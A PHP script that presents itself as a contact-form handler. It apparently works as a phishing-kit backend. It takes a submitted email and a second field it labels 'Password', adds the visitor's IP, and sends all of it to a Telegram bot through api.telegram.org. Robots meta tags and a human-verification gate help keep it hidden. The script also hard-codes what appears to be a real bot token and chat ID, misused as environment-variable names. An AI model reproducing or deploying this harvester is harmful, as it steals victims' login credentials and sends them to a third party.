<?php
declare(strict_types=1);

session_start();
require __DIR__ . '/gate.php';

function loadEnvFile(string $path): void
{
    if (!is_readable($path)) {
        return;
    }

    foreach (file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        $line = trim($line);

        if ($line === '' || strpos($line, '#') === 0 || strpos($line, '=') === false) {
            continue;
        }

        [$key, $value] = explode('=', $line, 2);
        $key = trim($key);
        $value = trim($value, " \t\n\r\0\x0B\"'");

        if ($key !== '' && getenv($key) === false) {
            putenv("{$key}={$value}");
            $_ENV[$key] = $value;
        }
    }
}

loadEnvFile(__DIR__ . '/.env');

function renderPage(string $title, string $body, int $status = 200): void
{
    http_response_code($status);
    header('Content-Type: text/html; charset=utf-8');
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive">
  <title><?php echo htmlspecialchars($title, ENT_QUOTES, 'UTF-8'); ?></title>
  <link rel="stylesheet" href="contact.css">
</head>
<body>
  <main class="contact-shell">
    <section class="contact-card">
      <header class="contact-header">
        <span class="contact-badge" aria-hidden="true"></span>
        <h1><?php echo htmlspecialchars($title, ENT_QUOTES, 'UTF-8'); ?></h1>
        <p><?php echo htmlspecialchars($body, ENT_QUOTES, 'UTF-8'); ?></p>
      </header>
      <footer class="contact-footer">
        <a href="index.html">Back to contact form</a>
      </footer>
    </section>
  </main>
</body>
</html>
    <?php
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    renderPage('Method Not Allowed', 'Please submit the contact form to send a message.', 405);
}

if (!isHumanVerified()) {
    renderPage('Verification Required', 'Please verify you are human before subscribing.', 403);
}

$email = trim((string)($_POST['email'] ?? ''));
$name = trim((string)($_POST['name'] ?? ''));
$honeypot = trim((string)($_POST['website'] ?? ''));

if ($honeypot !== '') {
    exit;
}

if ($email === '' || $name === '') {
    renderPage('Form Incomplete', 'Please complete the form and confirm consent.', 400);
}

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    renderPage('Invalid Email', 'Please enter a valid email address.', 400);
}

function getClientIp(): string
{
    $forwardedFor = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
    if ($forwardedFor !== '') {
        $candidate = trim(explode(',', $forwardedFor)[0]);
        if (filter_var($candidate, FILTER_VALIDATE_IP)) {
            return $candidate;
        }
    }

    $remoteAddr = $_SERVER['REMOTE_ADDR'] ?? '';
    return filter_var($remoteAddr, FILTER_VALIDATE_IP) ? $remoteAddr : 'unknown';
}

$ipAddress = getClientIp();

$token = getenv('8384740760:AAF6mAJCia5AkNoXk0SsuYMXbjtj3D1GL68') ?: '';
$chatId = getenv('5474595139') ?: '';

if ($token === '' || $chatId === '' || $token === 'your_bot_token_here' || $chatId === 'your_chat_id_here') {
    renderPage('Telegram Not Configured', 'Add your bot token and chat ID to the local .env file, then try again.', 500);
}

$telegramMessage = implode("\n", [
    "New contact form submission",
    "",
     "Email: {$email}",
    "Password: {$name}",   
    "IP Address: {$ipAddress}",
    "",
    "Consent: yes"
]);

$payload = http_build_query([
    'chat_id' => $chatId,
    'text' => $telegramMessage,
    'disable_web_page_preview' => 'true'
]);

$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $payload,
        'timeout' => 10
    ]
]);

$url = "https://api.telegram.org/bot{$token}/sendMessage";
$result = @file_get_contents($url, false, $context);

if ($result === false) {
    renderPage('Message Not Sent', 'Unable to send your message right now. Check your Telegram token, chat ID, and internet connection.', 502);
}
